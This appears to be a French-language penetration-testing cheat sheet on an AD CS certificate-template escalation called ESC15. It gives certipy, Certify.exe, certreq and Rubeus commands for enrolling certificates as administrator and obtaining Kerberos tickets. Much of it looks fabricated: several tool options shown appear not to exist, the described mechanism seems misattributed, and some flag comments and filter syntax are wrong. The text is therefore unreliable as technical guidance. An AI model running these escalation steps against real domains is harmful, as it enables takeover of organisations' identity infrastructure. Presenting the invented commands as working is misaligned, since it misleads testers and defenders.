### Description

ESC15 exploite des modèles de certificats qui autorisent l'enrollment via des mécanismes d'authentification alternatifs ou dégradés (comme l'authentification par certificat existant, PIN, ou autres méthodes faibles), permettant à un attaquant de contourner l'authentification traditionnelle et d'obtenir des certificats via des vecteurs d'authentification compromis ou affaiblis.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC15 si :

1. **Authentification alternative activée** - Le modèle accepte des méthodes d'authentification alternatives (PIN, certificat existant, etc.)
2. **Mécanismes d'authentification affaiblis** - Utilisation de méthodes moins sécurisées que l'authentification AD standard
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` via ces mécanismes alternatifs
4. **Validation insuffisante** - Pas de vérification stricte de l'identité via les mécanismes alternatifs

---

### Exploitation depuis linux (certipy)

Enumération des templates avec authentification alternative :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec focus sur les mécanismes d'authentification
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des templates avec auth alternative
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "Alternative.*Auth\|PIN\|Existing.*Cert"
```

Exploitation avec certificat existant :

```bash
# Utilisation d'un certificat existant pour enrollment
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'AlternativeAuthTemplate' -cert existing_cert.pfx -cert-password existing_password

# Avec escalation via certificat de niveau inférieur
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'WeakAuthTemplate' -existing-cert low_priv_cert.pfx -upn administrator@domain.local
```

Exploitation avec authentification PIN :

```bash
# Utilisation d'un PIN faible ou bruteforcé
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'PINTemplate' -pin "123456" -upn targetuser@domain.local

# Avec smart card simulée
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'SmartCardTemplate' -smartcard-pin "000000"
```

Authentification avec le certificat obtenu :

```bash
# Authentification avec le certificat d'escalation
certipy auth -pfx escalated.pfx -username targetuser -domain domain.local -dc-ip 192.168.1.10

# Si administrateur obtenu
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC15 - authentification alternative
Certify.exe find /vulnerable | findstr "Alternative.*Auth\|PIN\|Smart.*Card\|Existing.*Cert"

# Vérification manuelle des méthodes d'authentification
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Enrollment-Flag' -band 0x00000008 -or  # CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS
    $_.'msPKI-Private-Key-Flag' -band 0x00000010     # CTPRIVATEKEY_FLAG_EXPORTABLE_KEY
} | Select-Object Name, 'msPKI-Enrollment-Flag', 'msPKI-Private-Key-Flag'
```

Exploitation avec certificat existant :

```powershell
# Utilisation d'un certificat existant pour nouveau enrollment
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:AlternativeAuthTemplate /existingcert:existing_cert.pfx /existingcertpw:password123

# Avec escalation de privilèges
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:WeakAuthTemplate /existingcert:low_priv.pfx /altname:administrator@domain.local
```

Exploitation avec smart card ou PIN :

```powershell
# Utilisation de PIN faible
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:PINTemplate /pin:123456 /altname:targetuser@domain.local

# Simulation de smart card
certutil -csp "Microsoft Base Smart Card Crypto Provider" -user -pin 000000
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:SmartCardTemplate /smartcard
```

Exploitation via mécanismes Windows natifs :

```powershell
# Utilisation de certreq avec authentification alternative
certreq -new -user -csp "Microsoft Enhanced Cryptographic Provider v1.0" -pin 123456 request.inf request.req
certreq -submit -config "DC01.domain.local\domain-DC01-CA" request.req response.cer

# Avec certificat existant comme authentification
certreq -enroll -user -cert existing_cert_thumbprint -template AlternativeAuthTemplate
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
certutil -mergePFX response.cer,private_key.key escalated.pfx

# Authentification avec le certificat 
Rubeus.exe asktgt /user:targetuser /certificate:escalated.pfx /password:password123 /ptt

# Si escalation administrative réussie
Rubeus.exe asktgt /user:administrator /certificate:escalated.pfx /password:password123 /ptt
```